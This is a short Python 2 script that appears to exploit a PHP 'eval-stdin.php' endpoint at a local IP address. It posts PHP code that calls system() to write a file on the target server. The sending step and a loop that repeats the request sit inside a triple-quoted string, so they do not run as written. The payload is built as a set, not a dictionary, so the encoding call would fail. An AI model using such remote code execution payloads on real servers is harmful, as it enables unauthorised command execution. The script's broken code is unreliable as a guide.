import urllib
import urllib2
import time
data={"<?php system(\"echo 789 > a.php\");"}
data_urlencode = urllib.urlencode(data)
requrl = "http://192.168.1.100/eval-stdin.php"
req = urllib2.Request(url = requrl,data = data_urlencode)
'''
res_data = urllib2.urlopen(req)
res = res_data.read()
print res[:418]

while 1:
    res_data = urllib2.urlopen(req)
    time.sleep(0.1)
'''